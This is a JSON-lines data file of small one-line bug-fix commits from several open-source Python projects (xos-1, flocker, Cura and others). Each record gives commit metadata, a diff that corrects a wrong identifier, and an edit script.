{"project": "crime-bot", "commit_sha": "d9c2f01e40a25fb0a93b0a738158445b62cc827e", "parent_sha": "19aff7b292cd878a21637835ecce44eecedab8ee", "file_path": "app.py", "project_url": "https://github.com/Stivens73/crime-bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ def validate_city(message_text):\n #  return \"Statistics!\"\n \n def get_crime_report(city):\n-  url = 'https://www.neighborhoodscout.com/ca/{}/crime'.format(message_text)\n+  url = 'https://www.neighborhoodscout.com/ca/{}/crime'.format(city)\n   page = requests.get(url)\n   if (page.status.code == 200):\n       tree = html.fromstring(page.content)\n", "before": "url = 'https://www.neighborhoodscout.com/ca/{}/crime' . format ( message_text )", "after": "url = 'https://www.neighborhoodscout.com/ca/{}/crime' . format ( city )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:message_text\", 3, 64, 3, 76], \"city\"]]"}
{"project": "neural-doodle", "commit_sha": "007ba9bf219c9ba428199313c0b6d6a3e9d50455", "parent_sha": "ab95b0ff00b47187a3a04ef04bea147d078e44c2", "file_path": "doodle.py", "project_url": "https://github.com/Ericnano/neural-doodle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -454,7 +454,7 @@ class NeuralGenerator(object):\n             weights = patches.astype(np.float32)\n             weights[:,:-3] /= (norms_m * 3.0)\n             if semantic_weight: weights[:,-3:] /= (norms_s * semantic_weight)\n-            layer.W.set_value(patches)\n+            layer.W.set_value(weights)\n \n             nm = np.sqrt(np.sum(f[:,:-3] ** 2.0, axis=(1,), keepdims=True))\n             ns = np.sqrt(np.sum(f[:,-3:] ** 2.0, axis=(1,), keepdims=True))\n", "before": "layer . W . set_value ( patches )", "after": "layer . W . set_value ( weights )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:patches\", 3, 31, 3, 38], \"weights\"]]"}
{"project": "scrapy", "commit_sha": "625c69fdc73c74cdb4172c4642842ed4f6f31432", "parent_sha": "414857a593ad5b82fa21d6344928f43f93dc9f14", "file_path": "scrapy/commands/parse.py", "project_url": "https://github.com/OpneSourceAnalysisJourney/scrapy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -175,7 +175,7 @@ class Command(ScrapyCommand):\n                     cb = cb_method\n                 else:\n                     logger.error('Cannot find callback %(callback)r in spider: %(spider)s',\n-                                 {'callback': callback, 'spider': spider.name})\n+                                 {'callback': cb, 'spider': spider.name})\n                     return\n \n             # parse items and requests\n", "before": "else : logger . error ( 'Cannot find callback %(callback)r in spider: %(spider)s' , { 'callback' : callback , 'spider' : spider . name } )", "after": "else : logger . error ( 'Cannot find callback %(callback)r in spider: %(spider)s' , { 'callback' : cb , 'spider' : spider . name } )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:callback\", 3, 47, 3, 55], \"cb\"]]"}
{"project": "diventi", "commit_sha": "e70873ca61bd4916cba3cf0a772e53d0dbd84f55", "parent_sha": "85d797fbab4a1db8c8dc0310d40d0ecfdb4b1589", "file_path": "diventi/products/views.py", "project_url": "https://github.com/flavoi/diventi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ class ProductDetailView(DetailView):\n \n     # Returns only published products\n     def get_queryset(self):\n-        qs = super(ArticleDetailView, self).get_queryset()\n+        qs = super(ProductDetailView, self).get_queryset()\n         return qs.published()\n \n \n", "before": "qs = super ( ArticleDetailView , self ) . get_queryset ( )", "after": "qs = super ( ProductDetailView , self ) . get_queryset ( )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ArticleDetailView\", 3, 20, 3, 37], \"ProductDetailView\"]]"}
{"project": "xos-1", "commit_sha": "1da9b4c72442fc8e8c5bf71c6872a4fffa349711", "parent_sha": "c73d19e189139cde373d237e28bb6266182861f7", "file_path": "planetstack/core/models/slice.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class Slice(PlCoreBase):\n         nets = Network.objects.filter(slices=self)\n         nets.delete() \n         # delete slice deployments\n-        slice_deployments = SliceDeploymentss.objects.filter(slice=self)\n+        slice_deployments = SliceDeployments.objects.filter(slice=self)\n         slice_deployments.delete()\n         # delete slice privilege\n         slice_privileges = SlicePrivilege.objects.filter(slice=self)\n", "before": "slice_deployments = SliceDeploymentss . objects . filter ( slice = self )", "after": "slice_deployments = SliceDeployments . objects . filter ( slice = self )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:SliceDeploymentss\", 3, 29, 3, 46], \"SliceDeployments\"]]"}
{"project": "xos-1", "commit_sha": "bbcc190c0ab6e70f76e88f811193e194bdc22a65", "parent_sha": "743bed19b41dead59dd0db0c327cc1bcb1fb4fe7", "file_path": "planetstack/core/models/plcorebase.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ except:\n # the core model is abstract.\n class PlCoreBaseDeletionManager(models.Manager):\n     def get_query_set(self):\n-        return super(PlCoreBaseDeletedManager, self).get_query_set().filter(deleted=True)\n+        return super(PlCoreBaseDeletionManager, self).get_query_set().filter(deleted=True)\n \n # This manager will be inherited by all subclasses because\n # the core model is abstract.\n", "before": "return super ( PlCoreBaseDeletedManager , self ) . get_query_set ( ) . filter ( deleted = True )", "after": "return super ( PlCoreBaseDeletionManager , self ) . get_query_set ( ) . filter ( deleted = True )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:PlCoreBaseDeletedManager\", 3, 22, 3, 46], \"PlCoreBaseDeletionManager\"]]"}
{"project": "xos-1", "commit_sha": "c5b139b6c800c9ac65bdd0bc00c7fc1e067cc5dd", "parent_sha": "96fb34dc6c6c9f9e0b86f14019d31a6bba9de5c5", "file_path": "xos/observers/vcpe/steps/sync_vcpetenant.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -107,7 +107,7 @@ class SyncVCPETenant(SyncSliverUsingAnsible):\n                 logger.info(\"unsupported configuration -- bbs_slice is set, but backend_network_label is not\")\n             if not bbs_addrs:\n                 logger.info(\"failed to find any usable addresses on bbs_slice\")\n-        elif vcpe.bbs_server:\n+        elif vcpe_service.bbs_server:\n             bbs_addrs.append(vcpe.bbs_server)\n         else:\n             logger.info(\"neither bbs_slice nor bbs_server is configured in the vCPE\")\n", "before": "if not bbs_addrs : logger . info ( \"failed to find any usable addresses on bbs_slice\" ) elif vcpe . bbs_server : bbs_addrs . append ( vcpe . bbs_server ) else : logger . info ( \"neither bbs_slice nor bbs_server is configured in the vCPE\" )", "after": "if not bbs_addrs : logger . info ( \"failed to find any usable addresses on bbs_slice\" ) elif vcpe_service . bbs_server : bbs_addrs . append ( vcpe . bbs_server ) else : logger . info ( \"neither bbs_slice nor bbs_server is configured in the vCPE\" )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:vcpe\", 3, 14, 3, 18], \"vcpe_service\"]]"}
{"project": "xos-1", "commit_sha": "60df495a3618ad8acff01be35640f2965cf2e8bc", "parent_sha": "c5b139b6c800c9ac65bdd0bc00c7fc1e067cc5dd", "file_path": "xos/observers/vcpe/steps/sync_vcpetenant.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -108,7 +108,7 @@ class SyncVCPETenant(SyncSliverUsingAnsible):\n             if not bbs_addrs:\n                 logger.info(\"failed to find any usable addresses on bbs_slice\")\n         elif vcpe_service.bbs_server:\n-            bbs_addrs.append(vcpe.bbs_server)\n+            bbs_addrs.append(vcpe_service.bbs_server)\n         else:\n             logger.info(\"neither bbs_slice nor bbs_server is configured in the vCPE\")\n \n", "before": "bbs_addrs . append ( vcpe . bbs_server )", "after": "bbs_addrs . append ( vcpe_service . bbs_server )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:vcpe\", 3, 30, 3, 34], \"vcpe_service\"]]"}
{"project": "xos-1", "commit_sha": "e0fb4586a7d7728c54e7a4d9f7aacf5cef48b0c0", "parent_sha": "29098b2f2dadd29ede6597b57e3968a2d446730b", "file_path": "xos/tosca/resources/service.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class XOSService(XOSResource):\n \n             existing_tenancy = CoarseTenant.get_tenant_objects().filter(provider_service = provider_service, subscriber_service = obj)\n             if existing_tenancy:\n-                self.info(\"Tenancy relationship from %s to %s already exists\" % (str(service), str(provider_service)))\n+                self.info(\"Tenancy relationship from %s to %s already exists\" % (str(obj), str(provider_service)))\n             else:\n                 tenancy = CoarseTenant(provider_service = provider_service,\n                                        subscriber_service = obj)\n", "before": "self . info ( \"Tenancy relationship from %s to %s already exists\" % ( str ( service ) , str ( provider_service ) ) )", "after": "self . info ( \"Tenancy relationship from %s to %s already exists\" % ( str ( obj ) , str ( provider_service ) ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:service\", 3, 86, 3, 93], \"obj\"]]"}
{"project": "xos-1", "commit_sha": "bd4ec346e2ea27a882b87b12f0545f5fab03706e", "parent_sha": "2b3025c33e5560c6ea96c14dd52430d77588a461", "file_path": "plstackapi/planetstack/views/roles.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class RoleListCreate(APIView):\n         else:\n             roles = get_roles(data['auth'])\n             serializer = RoleSerializer(roles, many=True)\n-            return Response(Serializer.data)\n+            return Response(serializer.data)\n         \n             \n         \n", "before": "return Response ( Serializer . data )", "after": "return Response ( serializer . data )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:Serializer\", 3, 29, 3, 39], \"serializer\"]]"}
{"project": "xos-1", "commit_sha": "ee645271155b1c336cb7a4642feb69610bb376d4", "parent_sha": "27812cb1a0cb338dbc2fd123d32104ab6670e770", "file_path": "plstackapi/planetstack/views/roles.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -40,7 +40,7 @@ class RoleRetrieveUpdateDestroy(APIView):\n         roles = get_roles(data['auth'], {'role_id': pk})\n         if not roles:\n             return Response(status=status.HTTP_404_NOT_FOUND)\n-        serializer = RoleSerializer(data=role[0])\n+        serializer = RoleSerializer(data=roles[0])\n         return Response(serializer.data)                  \n \n     def put(self, request, pk, format=None):\n", "before": "serializer = RoleSerializer ( data = role [ 0 ] )", "after": "serializer = RoleSerializer ( data = roles [ 0 ] )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:role\", 3, 42, 3, 46], \"roles\"]]"}
{"project": "xos-1", "commit_sha": "10d2e1e9e4346d027edd10b4aab54e2773a82d14", "parent_sha": "9f25adcd5a05617a75a4abe759904d6238d6a22f", "file_path": "plstackapi/planetstack/api/users.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ def add_user(auth, fields):\n     site = lookup_site(fields) \n     if site: fields['site'] = site     \n     user = User(**fields)\n-    nova_fields = {'name': user.email[:site.email.find('@')],\n+    nova_fields = {'name': user.email[:user.email.find('@')],\n                    'email': user.email, \n                    'password': user.password,\n                    'enabled': user.enabled}    \n", "before": "nova_fields = { 'name' : user . email [ : site . email . find ( '@' ) ] , 'email' : user . email , 'password' : user . password , 'enabled' : user . enabled }", "after": "nova_fields = { 'name' : user . email [ : user . email . find ( '@' ) ] , 'email' : user . email , 'password' : user . password , 'enabled' : user . enabled }", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:site\", 3, 40, 3, 44], \"user\"]]"}
{"project": "xos-1", "commit_sha": "2b1c12f2991738dfffdd913ac1908be256eb5604", "parent_sha": "1724b6484cb94829a63ab02d1d608a269844c74c", "file_path": "plstackapi/planetstack/api/users.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ def update_user(auth, id, **fields):\n \n def delete_user(auth, filter={}):\n     driver = OpenStackDriver(client = auth_check(auth))   \n-    users = Users.objects.filter(**filter)\n+    users = User.objects.filter(**filter)\n     for user in users:\n         driver.delete_user(id=user.user_id) \n         user.delete()\n", "before": "users = Users . objects . filter ( ** filter )", "after": "users = User . objects . filter ( ** filter )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:Users\", 3, 13, 3, 18], \"User\"]]"}
{"project": "xos-1", "commit_sha": "509b318de8d23f0caf56049ddbfb22a582944e3f", "parent_sha": "46262d54484b4745f9fb43fe2f9993aca75e9b4c", "file_path": "plstackapi/planetstack/api/keys.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ def lookup_user(fields):\n         if isinstance(fields['user'], int):\n             users = User.objects.filter(id=fields['user'])\n         else:\n-            users = Site.objects.filter(email=fields['user'])\n+            users = User.objects.filter(email=fields['user'])\n         if users:\n             user = users[0]\n     return user \n", "before": "users = Site . objects . filter ( email = fields [ 'user' ] )", "after": "users = User . objects . filter ( email = fields [ 'user' ] )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:Site\", 3, 21, 3, 25], \"User\"]]"}
{"project": "xos-1", "commit_sha": "a9666d7195f2e59f54261d1a52a9867e826b19bc", "parent_sha": "01b140f4a401aa13cca53560a738ece4a4f8abee", "file_path": "xos/observers/base/SyncInstanceUsingAnsible.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,7 +161,7 @@ class SyncInstanceUsingAnsible(SyncStep):\n                 self.defer_sync(o, \"waiting on instance.instance_name\")\n                 return\n \n-            fields = self.get_ansible_fields(o)\n+            fields = self.get_ansible_fields(instance)\n \n             fields[\"ansible_tag\"] =  o.__class__.__name__ + \"_\" + str(o.id)\n \n", "before": "fields = self . get_ansible_fields ( o )", "after": "fields = self . get_ansible_fields ( instance )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:o\", 3, 46, 3, 47], \"instance\"]]"}
{"project": "xos-1", "commit_sha": "c5540fe41bae368dfcf102e2bddb36fe9c9f527a", "parent_sha": "6afe025ec9e87be1e2b5aa30170bc4a15f79ea34", "file_path": "xos/core/xoslib/methods/vpnview.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class VPNTenantList(XOSListCreateAPIView):\n \n     def get_queryset(self):\n         # Get every privilege for this user\n-        queryset = TenantPrivlege.objects.all().filter(user=self.request.user)\n+        queryset = TenantPrivilege.objects.all().filter(user=self.request.user)\n         queryset = [\n             priv.tenant for priv in queryset if priv.tenant.KIND == VPN_KIND]\n         for tenant in queryset:\n", "before": "queryset = TenantPrivlege . objects . all ( ) . filter ( user = self . request . user )", "after": "queryset = TenantPrivilege . objects . all ( ) . filter ( user = self . request . user )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:TenantPrivlege\", 3, 20, 3, 34], \"TenantPrivilege\"]]"}
{"project": "prior-engine", "commit_sha": "e8c85880c3d9f7f7359424220efbbcd8f2e48459", "parent_sha": "0ae46a47f8efb9418c7e5cb16cf86acddc0825b9", "file_path": "multiply_prior_engine/user_prior.py", "project_url": "https://github.com/multiply-org/prior-engine", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ import shutil\n \n import yaml\n \n-from .prior import PriorCreator\n+from .prior_creator import PriorCreator\n from .prior_engine import _get_config, PriorEngine\n \n", "before": "from . prior import PriorCreator", "after": "from . prior_creator import PriorCreator", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:prior\", 3, 7, 3, 12], \"prior_creator\"]]"}
{"project": "prior-engine", "commit_sha": "fa488930dc9def7fbf5ca17b113183de41524133", "parent_sha": "0ae46a47f8efb9418c7e5cb16cf86acddc0825b9", "file_path": "multiply_prior_engine/user_prior.py", "project_url": "https://github.com/multiply-org/prior-engine", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ import shutil\n \n import yaml\n \n-from .prior import PriorCreator\n+from .prior_creator import PriorCreator\n from .prior_engine import _get_config, PriorEngine\n \n", "before": "from . prior import PriorCreator", "after": "from . prior_creator import PriorCreator", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:prior\", 3, 7, 3, 12], \"prior_creator\"]]"}
{"project": "askbot-devel", "commit_sha": "060eaaa059ec2e956651e1d17b76ea4100fe0d89", "parent_sha": "ff5872e86f630c8712e88d0b6444ea69422e8ea8", "file_path": "askbot/deps/django_authopenid/forms.py", "project_url": "https://github.com/kingctan/askbot-devel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -394,7 +394,7 @@ class AccountRecoveryForm(forms.Form):\n             try:\n                 user = User.objects.filter(email__iexact=email)[0]\n                 self.cleaned_data['user'] = user\n-            except KeyError:\n+            except IndexError:\n                 del self.cleaned_data['email']\n                 message = _('Sorry, we don\\'t have this email address in the database')\n                 raise forms.ValidationError(message)\n", "before": "try : user = User . objects . filter ( email__iexact = email ) [ 0 ] self . cleaned_data [ 'user' ] = user except KeyError : del self . cleaned_data [ 'email' ] message = _ ( 'Sorry, we don\\'t have this email address in the database' ) raise forms . ValidationError ( message )", "after": "try : user = User . objects . filter ( email__iexact = email ) [ 0 ] self . cleaned_data [ 'user' ] = user except IndexError : del self . cleaned_data [ 'email' ] message = _ ( 'Sorry, we don\\'t have this email address in the database' ) raise forms . ValidationError ( message )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:KeyError\", 3, 20, 3, 28], \"IndexError\"]]"}
{"project": "Cura", "commit_sha": "ec6cb3ffdc483cdc41ffe60de8f91a48e923fc3d", "parent_sha": "4e034fbbd09201f5cbe7c8eef000c46910dedc97", "file_path": "PrinterApplication.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2,7 +2,7 @@ from Cura.Application import Application\n \n class PrinterApplication(Application):\n     def __init__(self):\n-        super(Application, self).__init__()\n+        super(PrinterApplication, self).__init__()\n         \n     def run(self):\n         print(\"Shoopdawoop\")\n", "before": "super ( Application , self ) . __init__ ( )", "after": "super ( PrinterApplication , self ) . __init__ ( )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:Application\", 3, 15, 3, 26], \"PrinterApplication\"]]"}
{"project": "harpoon-2", "commit_sha": "2edcee2e493bbf62829ccff483244f258b26f31a", "parent_sha": "a30ac3fdd7cbc660a531a16daa76c2bc2c19615e", "file_path": "harpoon/ship/builder.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -291,7 +291,7 @@ class Builder(object):\n         log.info(\"Building intermediate builder for recursive image\")\n         with self.remove_replaced_images(builder_conf):\n             with context.clone_with_new_dockerfile(conf, conf.recursive.make_builder_dockerfile(conf.docker_file)) as builder_context:\n-                self.log_context_size(provider_context, builder_conf)\n+                self.log_context_size(builder_context, builder_conf)\n                 self.do_build(builder_conf, builder_context, stream, image_name=builder_name)\n \n         log.info(\"Running and committing builder container for recursive image\")\n", "before": "self . log_context_size ( provider_context , builder_conf )", "after": "self . log_context_size ( builder_context , builder_conf )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:provider_context\", 3, 39, 3, 55], \"builder_context\"]]"}
{"project": "pyramid", "commit_sha": "18231f8387b01e21a846b57b4a01e3ceb46e607d", "parent_sha": "4fb1846113be568aa22b263aec628fe3d4267e6b", "file_path": "pyramid/tests/test_scripts/test_pshell.py", "project_url": "https://github.com/MatthewWilkes/pyramid", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -182,7 +182,7 @@ class TestPShellCommand(unittest.TestCase):\n             command,\n             {\n                 'ipython': lambda: dshell,\n-                'bpython': lambda: dhell,\n+                'bpython': lambda: dshell,\n             }\n         )\n \n", "before": "{ 'ipython' : lambda : dshell , 'bpython' : lambda : dhell , }", "after": "{ 'ipython' : lambda : dshell , 'bpython' : lambda : dshell , }", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:dhell\", 3, 36, 3, 41], \"dshell\"]]"}
{"project": "Cura", "commit_sha": "b1c49d0a917a7d4d90f0edab49f3e41bef52bfbb", "parent_sha": "433f7ce53fac9c1f03837b8ee3fb6f137e33984f", "file_path": "cura/BuildVolume.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -519,7 +519,7 @@ class BuildVolume(SceneNode):\n \n         move_from_wall_radius = 0 #Moves that start from outer wall.\n         if self._getSettingProperty(\"infill_wipe_dist\", \"value\"):\n-            wall_expansion_radius = max(move_from_wall_radius, self._getSettingProperty(\"infill_wipe_dist\", \"value\"))\n+            move_from_wall_radius = max(move_from_wall_radius, self._getSettingProperty(\"infill_wipe_dist\", \"value\"))\n         if self._getSettingProperty(\"travel_avoid_distance\", \"value\"):\n             move_from_wall_radius = max(move_from_wall_radius, self._getSettingProperty(\"travel_avoid_distance\", \"value\"))\n \n", "before": "wall_expansion_radius = max ( move_from_wall_radius , self . _getSettingProperty ( \"infill_wipe_dist\" , \"value\" ) )", "after": "move_from_wall_radius = max ( move_from_wall_radius , self . _getSettingProperty ( \"infill_wipe_dist\" , \"value\" ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:wall_expansion_radius\", 3, 13, 3, 34], \"move_from_wall_radius\"]]"}
{"project": "edx2bigquery", "commit_sha": "23a9277509ba1fd0a0d750b05062fa2af1beb667", "parent_sha": "3a02cedc56c5bc6a3a569bed531fab5d0b7a5509", "file_path": "edx2bigquery/load_staff.py", "project_url": "https://github.com/gregwe/edx2bigquery", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ def do_staff_csv(staff_csv_fn):\n     mypath = os.path.dirname(os.path.realpath(__file__))\n \n     gsfn = gsutil.gs_path_from_course_id('courses') / 'staff.csv'\n-    gsutil.upload_file_to_gs(course_listings_fn, gsfn)\n+    gsutil.upload_file_to_gs(staff_csv_fn, gsfn)\n \n     schema = json.loads(open('%s/schemas/schema_staff.json' % mypath).read())['staff']\n     bqutil.load_data_to_table(dataset, table, gsfn, schema, wait=True, format='csv', skiprows=1)\n", "before": "gsutil . upload_file_to_gs ( course_listings_fn , gsfn )", "after": "gsutil . upload_file_to_gs ( staff_csv_fn , gsfn )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:course_listings_fn\", 3, 30, 3, 48], \"staff_csv_fn\"]]"}
{"project": "NIPAP", "commit_sha": "dae49f526bce56ee50fb79e3ea8beeb13e021d70", "parent_sha": "d3b3b474dd0d7eaaf463dee57b83ab12e10ee59e", "file_path": "pynipap/pynipap.py", "project_url": "https://github.com/fredsod/NIPAP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -668,7 +668,7 @@ class Prefix(Pynipap):\n \n         try:\n             prefix = Prefix.list({'id': id})[0]\n-        except KeyError:\n+        except IndexError:\n             raise NipapNonExistentError('no prefix with ID ' + str(id) + ' found')\n \n         _cache['Prefix'][id] = prefix\n", "before": "try : prefix = Prefix . list ( { 'id' : id } ) [ 0 ] except KeyError : raise NipapNonExistentError ( 'no prefix with ID ' + str ( id ) + ' found' )", "after": "try : prefix = Prefix . list ( { 'id' : id } ) [ 0 ] except IndexError : raise NipapNonExistentError ( 'no prefix with ID ' + str ( id ) + ' found' )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:KeyError\", 3, 16, 3, 24], \"IndexError\"]]"}
{"project": "flocker", "commit_sha": "dea25749c8db7d739ab50275af910bfbd3c017cf", "parent_sha": "02d38812455eb407728b95079a84d7bf37caed2b", "file_path": "flocker/node/testtools.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -212,7 +212,7 @@ def ideployer_tests_factory(fixture):\n             deployer = fixture(self)\n-            result = deployer.calculate_changes(EMPTY, EMPTY)\n+            result = deployer.calculate_changes(EMPTY, EMPTY_STATE)\n             self.assertTrue(verifyObject(IStateChange, result))\n \n     return IDeployerTests\n", "before": "result = deployer . calculate_changes ( EMPTY , EMPTY )", "after": "result = deployer . calculate_changes ( EMPTY , EMPTY_STATE )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:EMPTY\", 1, 56, 1, 61], \"EMPTY_STATE\"]]"}
{"project": "flocker", "commit_sha": "d424f5c144cfdbca8e015f782b96756faabd5489", "parent_sha": "946df6147373dbb1657f2b0b174771537560ff47", "file_path": "admin/test/test_homebrew.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class GetChecksumTests(SynchronousTestCase):\n             filename=example_file.path, mode=\"wb\", mtime=0)\n         self.addCleanup(gzip_file.close)\n         gzip_file.write(\"Some content\")\n-        uri = 'file://' + file.path\n+        uri = 'file://' + example_file.path\n \n         self.assertEqual(\n             'da39a3ee5e6b4b0d3255bfef95601890afd80709',\n", "before": "uri = 'file://' + file . path", "after": "uri = 'file://' + example_file . path", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:file\", 3, 27, 3, 31], \"example_file\"]]"}
{"project": "PogoLibrary", "commit_sha": "bdb889ea6e200ee26e45997aa2fae73f71a291c1", "parent_sha": "65cd9147ac0fb1825dc3152dd7dbacff6b7c243a", "file_path": "loadPogoFieldFile.py", "project_url": "https://github.com/ab9621/PogoLibrary", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ def loadFieldFile(fileName):\n     if fileName[-11:] != '.pogo-field':\n-\t\tfieldName += '.pogo-field'\n+\t\tfileName += '.pogo-field'\n \n     with open(fileName, 'rb') as f:\n         header = struct.unpack('20s', f.read(20))\n", "before": "fieldName += '.pogo-field'", "after": "fileName += '.pogo-field'", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:fieldName\", 1, 3, 1, 12], \"fileName\"]]"}
{"project": "flocker", "commit_sha": "4140e21f845744e0e0e85d2e80a6e33a6ea4e2f9", "parent_sha": "8da165d809196a64fef2834458c8cfbe48ec1636", "file_path": "flocker/node/agents/ebs.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1194,7 +1194,7 @@ class EBSBlockDeviceAPI(object):\n         local_instance_id = self.compute_instance_id()\n-        if blockdevice_id != local_instance_id:\n+        if attach_to != local_instance_id:\n             raise AttachUnexpectedInstance(\n                 blockdevice_id, attach_to, local_instance_id)\n         ebs_volume = self._get_ebs_volume(blockdevice_id)\n", "before": "if blockdevice_id != local_instance_id : raise AttachUnexpectedInstance ( blockdevice_id , attach_to , local_instance_id )", "after": "if attach_to != local_instance_id : raise AttachUnexpectedInstance ( blockdevice_id , attach_to , local_instance_id )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:blockdevice_id\", 1, 12, 1, 26], \"attach_to\"]]"}
{"project": "flocker", "commit_sha": "283993bae963d7bd83e849e085a2dcafd9d97440", "parent_sha": "4a4ded326322a59e4768c09d5a986713d661a241", "file_path": "flocker/control/test/test_httpapi.py", "project_url": "https://github.com/datlowe/flocker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -772,7 +772,7 @@ class DeleteDatasetTestsMixin(APITestsMixin):\n         returned the expected result and that the persistence_service has\n         been updated.\n \n-        :param Dataset dataset: The dataset which will be moved.\n+        :param Dataset dataset: The dataset which will be deleted.\n         :param Deployment deployment: The deployment that contains the dataset.\n         :returns: A ``Deferred`` which fires when all assertions have been\n             executed.\n", "before": "been updated . : param Dataset dataset : The dataset which will be moved . : param Deployment", "after": "been updated . : param Dataset dataset : The dataset which will be deleted . : param Deployment", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:moved\", 3, 59, 3, 64], \"deleted\"]]"}
